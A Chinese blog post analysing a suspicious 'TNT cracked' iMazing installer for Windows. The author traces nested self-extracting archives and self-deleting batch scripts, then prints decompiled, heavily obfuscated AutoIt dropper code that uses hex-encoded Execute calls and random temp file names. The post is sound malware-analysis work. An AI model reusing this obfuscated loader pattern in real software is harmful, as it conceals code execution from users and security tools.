---
title: 分析iMazing_TNTCracked
description: 分析iMazing_TNTCracked
date: 2021-09-27 13:56:01+0800
categories:
    - Analyze
tags:
    - Analyze
    - Virus
    - Windows
---

本文来源：[Moeomu的博客](/zh-cn/posts/分析iMazing_TNTCracked/)

## 缘起

想找个爱思助手的备份，找上了iMazing，兴起找到了TNT破解版的iMazing，从[此链接](https://www.tntmac.com/tag/imazing-for-mac-crack/)下载适用于Windows的iMazing后却发现被Windows11自带的杀毒软件报毒，于是起了想分析这个破解版的兴趣

## 分析

### 1、概览

![解压](https://i.loli.net/2021/10/11/o4TszgPHIcYji2G.png)

- 如图所示，解压后是一个官方安装包以及一个`Create__Fix.exe`，正是这个文件被报毒，以此展开调查

### 2、Create__Fix.exe

![压缩包](https://i.loli.net/2021/10/11/LXSnr6B7TtgvuRK.png)

- 拖入DIE，看到这个文件似乎是个压缩包，将它解压，内容如图所示

![又一个压缩包](https://i.loli.net/2021/10/11/lfKRim4QrjzaUYP.png)

- 其中有一个`Fix.exe`以及一个`iMazing_fix.bat`，但是这个bat打开是乱码，使用C32Asm来看一下十六进制格式内容，如图所示

![清楚了](https://i.loli.net/2021/10/11/cxYuqhaTLU9vElP.png)

- 这不是看的很清楚嘛，这个`iMazing_fix.bat`的运行流程如下
  - 第一步，运行`Fix.exe`，参数是`pt147147`和`-d%dir%`，这个写法让我感觉这是个压缩文件了，貌似还真是
  - 第二步，等待一秒
  - 第三步，删除`Fix.exe`和`iMazing_fix.bat`
- 我不禁好奇，是什么原因让它向千层饼看齐，一层又一层没完没了
- 如图所示，不出意料它又是一个RAR压缩文件

![不是吧又来](https://i.loli.net/2021/10/11/F9l2jZUYENfCuHz.png)

### 3、Fix.exe

- 解压缩，需要密码，我猜密码是`t147147`，哦猜对了，TNT团队并没有定制自己的解压工具，用WinRAR的sfx自解压模块传参解压，解压后如图所示

![又一个解压](https://i.loli.net/2021/10/11/lm6yzf5asNHcRbS.png)

- 解压后的文件分为三个，bat脚本依旧是被加密的状态，再次使用十六进制编辑器阅读它
- 经过DIE分析，`data.bin`是个可执行程序，将它重命名为`data.exe`
- 经过DIE分析，`v1`是个二进制文件，暂时无法识别

### 4、Created_By_TNT_Team.bat

![Created_By_TNT_Team.bat](https://i.loli.net/2021/10/11/GmCj7cvfk8N62WB.png)

- 如图所示，这个脚本文件做的操作是以下几步
  - 第一步，清理屏幕
  - 第二步，关闭回显
  - 第三步，运行`data.bin`这个可执行程序，参数是`v1`
  - 第四步，删除`v1`、`data.bin`、`Created_By_TNT_Team.bat`

### 4、data.exe和v1

- 这个`data.exe`重命名后就十分明了，它是AutoIt3的脚本运行器，那么`v1`不出所料就是一个AutoIt3的脚本，后缀应该是`a3x`
- `v1`是编译完成的au3脚本，我在GitHub上找到了一些反编译器，例如[UnAutoIt](https://github.com/x0r19x91/UnAutoIt)
- 如图所示，解压完毕，从v1中释放出来一个`iMazing.exe`以及一个脚本，此脚本混淆极其严重，几乎无法阅读
- 被修改后的`iMazing.exe`还附带原始的数字签名，尽管它已经失效，看起来它将会本地修改`iMazing.exe`，应该算是一个文件补丁，但是看起来哈希没什么变化...

![extra](https://i.loli.net/2021/10/11/9yFOsWujGwPJmQ6.png)

> 以下是反编译出来的一些有用的代码

```AutoIt3
Func a2f00001b21_()
    For $ax0x0xa = 0x1 To 0x5
        Local $a2f00001b21sz_ = a2f00001b21x_()
        FileInstall("d3c0ef51c80f467bc9002bbf93fcb10d0c917dbaae819ccd925e2f8902d3c9c5229702964c538605098cce34d2e9cc90ce0618992ba26caea18b5b5ccd9dd0acf02370c4bc004868283b8067c8309862" & _
            "cf2f70d92252928d02af9b1c7d80c3303522b08f2", $a2f00001b21sz_, 0x1)
        Global $a2f00001b21, $os = Execute(BinaryToString("0x457865637574652842696E617279746F737472696E67282730783435373836353633373537343635323834323639364536313732373937343646373337343732363936453637323832373330373833" & _
            "3533333337333433373332333633393336343533363337333533333337333033363433333633393337333433323338333433363336333933363433333633353335333233363335333633313336333433" & _
            "3233383332333433343331333333323334333633333330333333303333333033333330333333313334333233333332333333313337333333373431333534363332333933323433333233373337343333" & _
            "33333333333338333333373334333933323337333234333333333133323339323732393239272929"))
        If IsArray($os) And $os[0x0] >= 0x46da Then ExitLoop
        Sleep(0xa)
    Next
    Execute(BinaryToString("0x457865637574652842696E617279746F737472696E67282730783435373836353633373537343635323834323639364536313732373937343646373337343732363936453637323832373330373833" & _
        "3333313332343233343336333633393336343333363335333433343336333533363433333633353337333433363335333233383332333433343331333333323334333633333330333333303333333033" & _
        "3333303333333133343332333333323333333133373333333734313335343633323339323732393239272929"))
EndFunc    ; -> a2f00001b21_

Func a2f00001b21x_()
    Local $a2f00001b21s1_ = a2f00001b21("4054656D70446972"), $a2f00001b21s3_ = a2f00001b21("31"), $a2f00001b21s4_ = a2f00001b21("5c"), $a2f00001b21s5_ = a2f00001b21("5c"), $a2f00001b21s6_ = a2f00001b21("37"), $a2f00001b21s8_ = a2f00001b21("3937"), $a2f00001b21s9_ = a2f00001b21("313232"), $a2f00001b21s7_ = a2f00001b21("31"), $a2f00001b21sa_
    Local $a2f00001b21s2_ = Execute($a2f00001b21s1_)
    If StringRight($a2f00001b21s2_, Number($a2f00001b21s3_)) <> $a2f00001b21s4_ Then $a2f00001b21s2_ = $a2f00001b21s2_ & $a2f00001b21s5_
    SRandom(Number(StringRight(TimerInit(), 0x4)))
    Do
        $a2f00001b21sa_ = ''
        While StringLen($a2f00001b21sa_) < Number($a2f00001b21s6_)
            $a2f00001b21sa_ = $a2f00001b21sa_ & Chr(Random(Number($a2f00001b21s8_), Number($a2f00001b21s9_), Number($a2f00001b21s7_)))
        WEnd
        $a2f00001b21sa_ = $a2f00001b21s2_ & $a2f00001b21sa_
    Until Not FileExists($a2f00001b21sa_)
    Return ($a2f00001b21sa_)
EndFunc    ; -> a2f00001b21x_

Func a2f00001b21($a2f00001b21)
    Local $a2f00001b21_
    For $x = 0x1 To StringLen($a2f00001b21) Step 0x2
        $a2f00001b21_ &= Chr(Dec(StringMid($a2f00001b21, $x, 0x2)))
    Next
    Return $a2f00001b21_
EndFunc    ; -> a2f00001b21
```

## 结论

- 它应该什么都没干仅仅只是释放了一个可执行文件，但是这个释放方式实在是令人奇怪
- 它最后释放的`iMazing.exe`是并未破解的版本，事情更加奇怪了
